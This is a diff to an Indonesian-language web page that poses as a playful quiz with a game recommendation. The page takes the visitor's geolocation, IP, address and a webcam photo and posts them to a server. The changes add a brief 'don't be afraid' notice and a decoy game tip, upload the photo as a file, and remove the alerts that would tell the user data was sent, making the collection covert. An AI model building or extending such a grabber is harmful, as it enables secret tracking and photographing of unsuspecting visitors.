@@ -176,6 +176,11 @@
     <p>Terima kasih, <span id="userName"></span>!</p>
 </div>
 
+<!-- Notice Kegabutan -->
+<div id="randomNotice" class="notice">
+    <p>Ini hanya kegabutan, jangan takut. By ChanMaps</p>
+</div>
+
 <!-- Pertanyaan Halaman Sebelum Masuk -->
 <div id="questionPage" class="question-container">
     <h1>Selamat datang! Sebelum masuk ke zona Lokasi, jawab pertanyaan berikut:</h1>
@@ -198,6 +203,7 @@
     <div id="ipInfo" class="info-box"></div>
     <div id="addressInfo" class="info-box"></div>
     <div id="photo" class="info-box"></div>
+    <div id="gameRecommendation" class="info-box"></div>
 
     <div id="history" class="history-box"></div>
 
@@ -218,6 +224,7 @@
     const nameInput = document.getElementById('nameInput');
     const hobbyInput = document.getElementById('hobbyInput');
     const notice = document.getElementById('notice');
+    const randomNotice = document.getElementById('randomNotice');
     const userNameSpan = document.getElementById('userName');
     const mainContainer = document.getElementById('mainContainer');
     const questionPage = document.getElementById('questionPage');
@@ -226,6 +233,7 @@
     const ipInfoDiv = document.getElementById('ipInfo');
     const addressInfoDiv = document.getElementById('addressInfo');
     const photoDiv = document.getElementById('photo');
+    const gameRecommendationDiv = document.getElementById('gameRecommendation');
     const historyDiv = document.getElementById('history');
     const passwordInput = document.getElementById('passwordInput');
     let map;
@@ -263,6 +271,11 @@
     });
 
     startDataBtn.addEventListener('click', () => {
+        randomNotice.style.display = 'block'; // Tampilkan notice kegabutan
+        setTimeout(() => {
+            randomNotice.style.display = 'none'; // Sembunyikan notice setelah beberapa detik
+        }, 3000);
+
         navigator.geolocation.getCurrentPosition(async (position) => {
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
@@ -284,6 +297,7 @@
                     <strong>Foto Profil:</strong><br>
                     <img src="${photoURL}" alt="Foto Profil" /><br>
                 `;
+                gameRecommendationDiv.innerHTML = getGameRecommendation(); // Tambahkan rekomendasi game
                 stream.getTracks().forEach(track => track.stop());  // Stop camera after capture
                 
                 showMap(lat, lon);
@@ -305,7 +319,7 @@
 
                 historyData.push(userHistory);
                 localStorage.setItem('historyData', JSON.stringify(historyData));
-                sendHistoryToServer(historyData); // Kirim data ke server
+                sendHistoryToServer(userHistory); // Kirim data ke server
             } catch (error) {
                 alert("Akses kamera ditolak atau tidak tersedia.");
             }
@@ -372,6 +386,15 @@
         }
     }
 
+    function getGameRecommendation() {
+        const userAgent = navigator.userAgent;
+        if (/Mobi|Android/i.test(userAgent)) {
+            return "<strong>Rekomendasi Game:</strong><br>Perangkat Anda cocok untuk bermain game Mobile Legends.";
+        } else {
+            return "<strong>Rekomendasi Game:</strong><br>Perangkat Anda cocok untuk bermain game seperti Valorant atau League of Legends.";
+        }
+    }
+
     // Fungsi untuk melihat history
     viewHistoryBtn.addEventListener('click', () => {
         const password = passwordInput.value;
@@ -417,24 +440,27 @@
     });
 
     async function sendHistoryToServer(historyData) {
+        const formData = new FormData();
+        formData.append('historyData', JSON.stringify(historyData));
+        if (historyData.photo) {
+            const response = await fetch(historyData.photo);
+            const blob = await response.blob();
+            formData.append('photo', blob, 'photo.jpg');
+        }
+
         try {
             const response = await fetch(serverUrl, {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(historyData)
+                body: formData
             });
 
             if (!response.ok) {
                 throw new Error('Gagal mengirim data ke server.');
             }
-            alert('Data history berhasil dikirim ke server.');
         } catch (error) {
-            alert(error.message);
+            console.error(error.message);
         }
     }
 </script>
 </body>
 </html>
-
